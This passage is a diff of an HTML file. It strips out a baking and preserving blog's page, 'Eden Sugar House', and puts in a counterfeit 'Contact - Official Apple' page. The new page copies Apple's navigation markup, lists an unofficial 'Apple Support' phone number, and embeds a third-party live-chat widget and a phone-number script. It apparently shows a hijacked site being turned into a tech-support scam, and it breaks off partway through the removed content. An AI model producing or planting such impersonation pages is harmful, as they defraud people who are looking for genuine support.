@@ -1,1329 +1,379 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- SEO essentials -->
-  <title>Eden Sugar House · Slow Baking, Wild Sweetness & Preserving</title>
-  <meta name="description" content="Eden Sugar House — a recipe journal for slow baking, seasonal fruit preserves, and wild sweetness. Long-form guides, tested recipes, and pantry wisdom.">
-  <meta property="og:title" content="Eden Sugar House · Slow Baking, Wild Sweetness & Preserving">
-  <meta property="og:description" content="A quiet corner for bakers and preservers. Recipes, techniques, and stories from a sugar house kitchen.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://edensugarhouse.com/">
-  <meta property="og:image" content="https://edensugarhouse.com/images/og-cover.jpg">
-  <meta name="twitter:card" content="summary_large_image">
-  <link rel="canonical" href="https://edensugarhouse.com/">
-  <!-- Fonts & minimal style reset -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600&family=Newsreader:ital,opsz,wght@0,6..72,300;0,6..72,400;0,6..72,500;1,6..72,400&display=swap" rel="stylesheet">
-  <style>
-    /* ---------- design tokens ---------- */
-    :root {
-      --bg: #fcf9f4;
-      --surface: #ffffff;
-      --ink: #1e1b16;
-      --ink-soft: #3a352e;
-      --muted: #6b645c;
-      --border: #e2dbd2;
-      --border-light: #eee8e0;
-      --accent: #9f6b4b;
-      --accent-soft: #f2e3d9;
-      --accent-deep: #6e4e38;
-      --sage: #72856b;
-      --radius-card: 16px;
-      --radius-sm: 6px;
-      --shadow-sm: 0 4px 12px rgba(0,0,0,0.02), 0 2px 6px rgba(0,0,0,0.02);
-      --font-serif: 'Newsreader', Georgia, 'Times New Roman', serif;
-      --font-sans: 'Inter', system-ui, -apple-system, sans-serif;
-      --max-blog-width: 1120px;
-    }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    /* ---------- base ---------- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    html {
-      scroll-behavior: smooth;
-    }
-    body {
-      background: var(--bg);
-      color: var(--ink);
-      font-family: var(--font-sans);
-      font-size: 1rem;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-    }
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-    }
-    a {
-      color: inherit;
-      text-decoration: none;
-    }
-    button, input {
-      font: inherit;
-      color: inherit;
-    }
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-4vWoWKoAAC8kAVwpL5puO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-    /* ---------- typography ---------- */
-    h1, h2, h3, h4 {
-      font-family: var(--font-serif);
-      font-weight: 400;
-      line-height: 1.2;
-      letter-spacing: -0.02em;
-    }
-    h1 {
-      font-size: clamp(2rem, 7vw, 3.6rem);
-      font-weight: 400;
-      letter-spacing: -0.03em;
-    }
-    h2 {
-      font-size: clamp(1.8rem, 4vw, 2.4rem);
-      margin-bottom: 1rem;
-    }
-    h3 {
-      font-size: 1.5rem;
-      margin-bottom: 0.75rem;
-      font-weight: 450;
-    }
-    p {
-      color: var(--ink-soft);
-      margin-bottom: 1.25rem;
-    }
-    .article-body p {
-      font-size: 1.125rem;
-      line-height: 1.7;
-      color: #2a2722;
-    }
-    .article-body h3 {
-      margin-top: 2rem;
-      margin-bottom: 0.75rem;
-    }
-    .article-body ul, .article-body ol {
-      margin: 1.5rem 0 1.5rem 1.5rem;
-      color: var(--ink-soft);
-    }
-    .article-body li {
-      margin-bottom: 0.5rem;
-      font-size: 1.125rem;
-    }
 
-    /* ---------- layout containers ---------- */
-    .container {
-      max-width: var(--max-blog-width);
-      margin: 0 auto;
-      padding: 0 1.5rem;
-    }
-    .blog-grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 2.5rem;
-    }
-    @media (min-width: 880px) {
-      .blog-grid {
-        grid-template-columns: 1fr 300px;
-        gap: 3rem;
-      }
-    }
 
-    /* ---------- header ---------- */
-    .site-header {
-      background: var(--surface);
-      border-bottom: 1px solid var(--border-light);
-      padding: 1.25rem 0;
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      backdrop-filter: blur(8px);
-      background: rgba(255,255,255,0.92);
-    }
-    .header-inner {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      gap: 1rem;
-    }
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 0.6rem;
-      font-family: var(--font-serif);
-      font-size: 1.8rem;
-      font-weight: 400;
-      letter-spacing: -0.02em;
-      color: var(--ink);
-      line-height: 1;
-    }
-    .logo-mark {
-      display: inline-block;
-      width: 34px;
-      height: 34px;
-      background: var(--accent);
-      border-radius: 50% 50% 50% 0;
-      transform: rotate(-45deg);
-      position: relative;
-      flex-shrink: 0;
-    }
-    .logo-mark::after {
-      content: "◇";
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) rotate(45deg);
-      color: #fff;
-      font-size: 1rem;
-      font-weight: 600;
-    }
-    .nav-links {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1.8rem;
-      align-items: center;
-      font-size: 0.95rem;
-      font-weight: 450;
-      color: var(--muted);
-    }
-    .nav-links a:hover {
-      color: var(--accent);
-    }
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-    /* ---------- search and filter bar ---------- */
-    .search-section {
-      margin: 2rem 0 1rem;
-    }
-    .search-box {
-      display: flex;
-      align-items: center;
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 40px;
-      padding: 0.4rem 0.4rem 0.4rem 1.2rem;
-      transition: border 0.15s;
-    }
-    .search-box:focus-within {
-      border-color: var(--accent);
-    }
-    .search-box input {
-      border: none;
-      background: transparent;
-      padding: 0.6rem 0;
-      width: 100%;
-      outline: none;
-      font-size: 1rem;
-    }
-    .search-box button {
-      background: var(--accent);
-      border: none;
-      color: #fff;
-      padding: 0.6rem 1.4rem;
-      border-radius: 30px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background 0.15s;
-      white-space: nowrap;
-    }
-    .search-box button:hover {
-      background: var(--accent-deep);
-    }
-    .category-filters {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.5rem;
-      margin-top: 1.2rem;
-    }
-    .category-filters button {
-      background: transparent;
-      border: 1px solid var(--border);
-      padding: 0.35rem 1rem;
-      border-radius: 30px;
-      font-size: 0.85rem;
-      color: var(--muted);
-      cursor: pointer;
-      transition: all 0.15s;
-    }
-    .category-filters button.active,
-    .category-filters button:hover {
-      background: var(--accent);
-      border-color: var(--accent);
-      color: #fff;
-    }
-
-    /* ---------- featured article ---------- */
-    .featured {
-      background: var(--surface);
-      border-radius: var(--radius-card);
-      border: 1px solid var(--border-light);
-      overflow: hidden;
-      margin: 2rem 0 3rem;
-      display: grid;
-      grid-template-columns: 1fr;
-      box-shadow: var(--shadow-sm);
-    }
-    @media (min-width: 700px) {
-      .featured {
-        grid-template-columns: 1fr 0.9fr;
-      }
-    }
-    .featured-image {
-      background: #d9cfc4;
-      min-height: 260px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: var(--font-serif);
-      font-size: 1.8rem;
-      color: #fff;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100"><circle cx="30" cy="30" r="18" fill="%23c2a68c" opacity="0.8"/><circle cx="70" cy="50" r="22" fill="%23b39273" opacity="0.7"/><circle cx="50" cy="80" r="15" fill="%23a87e5f" opacity="0.9"/></svg>');
-      background-size: cover;
-      background-position: center;
-    }
-    .featured-content {
-      padding: 2rem 1.8rem 2rem 1.8rem;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-    }
-    .featured-content .meta {
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--accent);
-      font-weight: 600;
-      margin-bottom: 0.5rem;
-    }
-    .featured-content h2 {
-      font-size: clamp(1.6rem, 4vw, 2.2rem);
-      margin-bottom: 0.75rem;
-      line-height: 1.25;
-    }
-    .featured-content p {
-      font-size: 1.05rem;
-      margin-bottom: 1.2rem;
-      color: var(--muted);
-    }
-
-    /* ---------- article cards ---------- */
-    .section-title {
-      display: flex;
-      align-items: baseline;
-      justify-content: space-between;
-      margin: 2.5rem 0 1.5rem;
-      border-bottom: 1px solid var(--border-light);
-      padding-bottom: 0.75rem;
-    }
-    .section-title h2 {
-      margin-bottom: 0;
-      font-size: 1.8rem;
-    }
-    .section-title span {
-      font-size: 0.85rem;
-      color: var(--muted);
-      font-weight: 450;
-    }
-    .card-grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 1.8rem;
-    }
-    @media (min-width: 600px) {
-      .card-grid {
-        grid-template-columns: repeat(2, 1fr);
-      }
-    }
-    .article-card {
-      background: var(--surface);
-      border: 1px solid var(--border-light);
-      border-radius: var(--radius-card);
-      overflow: hidden;
-      transition: box-shadow 0.2s, border-color 0.2s;
-      display: flex;
-      flex-direction: column;
-      height: 100%;
-      box-shadow: var(--shadow-sm);
-    }
-    .article-card:hover {
-      border-color: var(--border);
-      box-shadow: 0 8px 20px rgba(0,0,0,0.03), 0 2px 8px rgba(0,0,0,0.02);
-    }
-    .card-img {
-      height: 170px;
-      background: #e5dbd0;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 120" width="200" height="120"><rect width="200" height="120" fill="%23e8ddd2"/><circle cx="70" cy="60" r="32" fill="%23d4b8a2" opacity="0.7"/><circle cx="140" cy="40" r="24" fill="%23c7a585" opacity="0.8"/><circle cx="160" cy="90" r="18" fill="%23b58b6a" opacity="0.9"/></svg>');
-      background-size: cover;
-      background-position: center;
-    }
-    .card-content {
-      padding: 1.5rem 1.5rem 1.8rem;
-      display: flex;
-      flex-direction: column;
-      flex: 1;
-    }
-    .card-meta {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--accent);
-      font-weight: 600;
-      margin-bottom: 0.5rem;
-    }
-    .card-content h3 {
-      font-size: 1.35rem;
-      line-height: 1.3;
-      margin-bottom: 0.6rem;
-      font-weight: 500;
-    }
-    .card-content p {
-      font-size: 0.95rem;
-      color: var(--muted);
-      margin-bottom: 1rem;
-      flex: 1;
-    }
-    .card-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.8rem;
-      color: var(--muted);
-      border-top: 1px solid var(--border-light);
-      padding-top: 0.9rem;
-    }
-
-    /* ---------- sidebar ---------- */
-    .sidebar {
-      display: flex;
-      flex-direction: column;
-      gap: 2rem;
-    }
-    .sidebar-widget {
-      background: var(--surface);
-      border: 1px solid var(--border-light);
-      border-radius: var(--radius-card);
-      padding: 1.5rem;
-      box-shadow: var(--shadow-sm);
-    }
-    .sidebar-widget h3 {
-      font-size: 1.2rem;
-      margin-bottom: 1rem;
-      font-weight: 500;
-      border-bottom: 1px solid var(--border-light);
-      padding-bottom: 0.75rem;
-    }
-    .sidebar-widget ul {
-      list-style: none;
-    }
-    .sidebar-widget li {
-      margin-bottom: 0.9rem;
-      font-size: 0.95rem;
-      line-height: 1.4;
-    }
-    .sidebar-widget a {
-      color: var(--ink-soft);
-    }
-    .sidebar-widget a:hover {
-      color: var(--accent);
-      text-decoration: underline;
-      text-underline-offset: 3px;
-    }
-    .sidebar-widget .small-meta {
-      font-size: 0.75rem;
-      color: var(--muted);
-      margin-top: 0.2rem;
-    }
-
-    /* ---------- newsletter ---------- */
-    .newsletter {
-      background: var(--surface);
-      border: 1px solid var(--border-light);
-      border-radius: var(--radius-card);
-      padding: 2.5rem 2rem;
-      margin: 3rem 0;
-      text-align: center;
-      box-shadow: var(--shadow-sm);
-    }
-    .newsletter h2 {
-      font-size: 1.8rem;
-      margin-bottom: 0.5rem;
-    }
-    .newsletter p {
-      max-width: 500px;
-      margin: 0 auto 1.5rem;
-    }
-    .newsletter-form {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 0.6rem;
-      max-width: 460px;
-      margin: 0 auto;
-    }
-    .newsletter-form input {
-      flex: 1 1 200px;
-      padding: 0.8rem 1rem;
-      border: 1px solid var(--border);
-      border-radius: 40px;
-      background: var(--bg);
-      outline: none;
-    }
-    .newsletter-form input:focus {
-      border-color: var(--accent);
-    }
-    .newsletter-form button {
-      background: var(--accent);
-      color: #fff;
-      border: none;
-      padding: 0.8rem 1.8rem;
-      border-radius: 40px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background 0.15s;
-    }
-    .newsletter-form button:hover {
-      background: var(--accent-deep);
-    }
-
-    /* ---------- FAQ ---------- */
-    .faq-grid {
-      display: grid;
-      gap: 1rem;
-      margin: 2rem 0;
-    }
-    .faq-item {
-      background: var(--surface);
-      border: 1px solid var(--border-light);
-      border-radius: var(--radius-sm);
-      padding: 1.25rem 1.5rem;
-    }
-    .faq-item h3 {
-      font-size: 1.1rem;
-      margin-bottom: 0.5rem;
-      font-weight: 500;
-    }
-    .faq-item p {
-      margin-bottom: 0;
-      font-size: 0.95rem;
-      color: var(--muted);
-    }
-
-    /* ---------- article reading layout (single) ---------- */
-    .article-header {
-      margin: 2rem 0 1.5rem;
-    }
-    .article-header h1 {
-      font-size: clamp(2.2rem, 6vw, 3.2rem);
-      margin-bottom: 0.5rem;
-    }
-    .article-meta {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1.2rem;
-      font-size: 0.9rem;
-      color: var(--muted);
-      margin: 1rem 0 1.5rem;
-      border-bottom: 1px solid var(--border-light);
-      padding-bottom: 1.2rem;
-    }
-    .article-author {
-      display: flex;
-      align-items: center;
-      gap: 0.8rem;
-      margin: 1.5rem 0;
-    }
-    .author-avatar {
-      width: 48px;
-      height: 48px;
-      background: var(--accent-soft);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: var(--accent-deep);
-      font-weight: 600;
-      font-family: var(--font-serif);
-      font-size: 1.2rem;
-    }
-    .author-info {
-      font-size: 0.9rem;
-      line-height: 1.4;
-    }
-    .author-info strong {
-      color: var(--ink);
-      font-weight: 600;
-    }
-
-    /* ---------- footer ---------- */
-    .site-footer {
-      background: var(--surface);
-      border-top: 1px solid var(--border-light);
-      padding: 3rem 0 2rem;
-      margin-top: 4rem;
-    }
-    .footer-grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 2.5rem;
-    }
-    @media (min-width: 700px) {
-      .footer-grid {
-        grid-template-columns: 2fr 1fr 1fr 1fr;
-      }
-    }
-    .footer-col h4 {
-      font-size: 1rem;
-      font-family: var(--font-sans);
-      font-weight: 600;
-      margin-bottom: 1rem;
-      color: var(--ink);
-    }
-    .footer-col ul {
-      list-style: none;
-    }
-    .footer-col li {
-      margin-bottom: 0.6rem;
-      font-size: 0.9rem;
-      color: var(--muted);
-    }
-    .footer-col a:hover {
-      color: var(--accent);
-    }
-    .footer-bottom {
-      margin-top: 2.5rem;
-      padding-top: 1.5rem;
-      border-top: 1px solid var(--border-light);
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      font-size: 0.85rem;
-      color: var(--muted);
-      gap: 1rem;
-    }
-
-    /* ---------- utility ---------- */
-    .hidden { display: none !important; }
-    .tag {
-      display: inline-block;
-      background: var(--accent-soft);
-      color: var(--accent-deep);
-      padding: 0.2rem 0.7rem;
-      border-radius: 30px;
-      font-size: 0.75rem;
-      font-weight: 500;
-    }
-    .mt-2 { margin-top: 2rem; }
-    .mb-2 { margin-bottom: 2rem; }
-  </style>
 </head>
+
 <body>
-  <!-- ========== HEADER ========== -->
-  <header class="site-header">
-    <div class="container header-inner">
-      <a href="/" class="logo" aria-label="Eden Sugar House home">
-        <span class="logo-mark" aria-hidden="true"></span>
-        Eden Sugar House
-      </a>
-      <nav class="nav-links" aria-label="Main navigation">
-         <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li> 
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="categories.html">Categories</a></li>
-      </nav>
-    </div>
-  </header>
-
-  <main class="container">
-    <!-- ========== SEARCH + FILTER ========== -->
-    <section class="search-section" aria-label="Search and filter articles">
-      <div class="search-box">
-        <input type="search" id="searchInput" placeholder="Search recipes, techniques, or ingredients…" aria-label="Search articles">
-        <button id="searchBtn" type="button">Search</button>
-      </div>
-      <div class="category-filters" id="categoryFilters">
-        <button class="active" data-category="all">All</button>
-        <button data-category="baking">Baking</button>
-        <button data-category="preserving">Preserving</button>
-        <button data-category="seasonal">Seasonal</button>
-        <button data-category="pantry">Pantry</button>
-        <button data-category="technique">Technique</button>
-      </div>
-    </section>
-
-    <!-- ========== BLOG GRID ========== -->
-    <div class="blog-grid">
-      <!-- MAIN CONTENT COLUMN -->
-      <div class="main-column">
-        <!-- FEATURED ARTICLE -->
-        <article class="featured" id="featuredArticle">
-          <div class="featured-image" role="img" aria-label="Rustic sourdough loaf with honey and figs on a wooden table">
-            <!-- subtle visual: CSS pattern only; no external image -->
-          </div>
-          <div class="featured-content">
-            <div class="meta">Featured · Baking</div>
-            <h2><a href="#article-sourdough">The Quiet Art of Sourdough: A 36-Hour Journey</a></h2>
-            <p>Why patience, a little wild yeast, and a cold retard can transform three simple ingredients into something transcendent. A complete guide for the home baker.</p>
-            <div class="card-footer" style="border-top: none; padding-top: 0;">
-              <span>March 12, 2025</span>
-              <span>18 min read</span>
-            </div>
-          </div>
-        </article>
-
-        <!-- SECTION: LATEST ARTICLES (content-rich) -->
-        <div class="section-title">
-          <h2>Latest from the kitchen</h2>
-          <span>12 articles</span>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-        <div class="card-grid" id="articleGrid">
-          <!-- CARD 1 -->
-          <article class="article-card" data-category="baking" data-title="sourdough starter maintenance">
-            <div class="card-img" role="img" aria-label="Glass jar with bubbling sourdough starter"></div>
-            <div class="card-content">
-              <div class="card-meta">Baking · Technique</div>
-              <h3><a href="#article-starter">Keeping a Sourdough Starter: A Perpetual Guide</a></h3>
-              <p>Feeding schedules, hydration math, and how to revive a neglected jar. Everything you need for a thriving culture.</p>
-              <div class="card-footer">
-                <span>Mar 10, 2025</span>
-                <span>14 min</span>
-              </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-959-1904 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </article>
-          <!-- CARD 2 -->
-          <article class="article-card" data-category="preserving" data-title="preserving lemons">
-            <div class="card-img" role="img" aria-label="Preserved lemons in a glass jar with bay leaves"></div>
-            <div class="card-content">
-              <div class="card-meta">Preserving</div>
-              <h3><a href="#article-lemons">Preserved Lemons: Salt, Time, and Transformation</a></h3>
-              <p>How to make silky, umami-rich preserved lemons at home. Plus five ways to use them beyond tagine.</p>
-              <div class="card-footer">
-                <span>Mar 7, 2025</span>
-                <span>11 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 3 -->
-          <article class="article-card" data-category="seasonal" data-title="rhubarb recipes">
-            <div class="card-img" role="img" aria-label="Fresh rhubarb stalks on a linen cloth"></div>
-            <div class="card-content">
-              <div class="card-meta">Seasonal</div>
-              <h3><a href="#article-rhubarb">Rhubarb Season: 9 Ways to Cook with the First Stalks</a></h3>
-              <p>From classic crumble to savory chutney, make the most of spring's tartest gift.</p>
-              <div class="card-footer">
-                <span>Mar 4, 2025</span>
-                <span>16 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 4 -->
-          <article class="article-card" data-category="pantry" data-title="vanilla extract">
-            <div class="card-img" role="img" aria-label="Vanilla beans and a bottle of homemade extract"></div>
-            <div class="card-content">
-              <div class="card-meta">Pantry</div>
-              <h3><a href="#article-vanilla">DIY Vanilla Extract: Better Than Store-Bought</a></h3>
-              <p>Two ingredients, eight weeks, and a lifetime of richer baking. Plus how to choose beans.</p>
-              <div class="card-footer">
-                <span>Mar 1, 2025</span>
-                <span>9 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 5 -->
-          <article class="article-card" data-category="baking" data-title="brown butter chocolate chip cookies">
-            <div class="card-img" role="img" aria-label="Stack of chocolate chip cookies with flaky salt"></div>
-            <div class="card-content">
-              <div class="card-meta">Baking</div>
-              <h3><a href="#article-cookies">Brown Butter Chocolate Chip Cookies: The Only Recipe You Need</a></h3>
-              <p>Nutty, chewy, and deeply caramelized. Our most requested cookie formula.</p>
-              <div class="card-footer">
-                <span>Feb 26, 2025</span>
-                <span>12 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 6 -->
-          <article class="article-card" data-category="preserving" data-title="fermented hot sauce">
-            <div class="card-img" role="img" aria-label="Fermenting hot sauce in a glass jar with chili peppers"></div>
-            <div class="card-content">
-              <div class="card-meta">Preserving · Technique</div>
-              <h3><a href="#article-hotsauce">Fermented Hot Sauce: A Beginner's Guide to Fiery Flavor</a></h3>
-              <p>Lacto-fermentation adds complexity and depth. Master the brine, then experiment.</p>
-              <div class="card-footer">
-                <span>Feb 23, 2025</span>
-                <span>13 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 7 -->
-          <article class="article-card" data-category="seasonal" data-title="asparagus spring">
-            <div class="card-img" role="img" aria-label="Grilled asparagus with lemon and parmesan"></div>
-            <div class="card-content">
-              <div class="card-meta">Seasonal</div>
-              <h3><a href="#article-asparagus">Asparagus: Roast, Pickle, and Purée</a></h3>
-              <p>Three essential techniques for peak-season asparagus, plus a silky soup recipe.</p>
-              <div class="card-footer">
-                <span>Feb 20, 2025</span>
-                <span>10 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 8 -->
-          <article class="article-card" data-category="technique" data-title="tempering chocolate">
-            <div class="card-img" role="img" aria-label="Tempered chocolate with a glossy finish"></div>
-            <div class="card-content">
-              <div class="card-meta">Technique</div>
-              <h3><a href="#article-chocolate">Tempering Chocolate Without a Thermometer</a></h3>
-              <p>The seeding method explained step-by-step, with troubleshooting for bloom and streaks.</p>
-              <div class="card-footer">
-                <span>Feb 17, 2025</span>
-                <span>11 min</span>
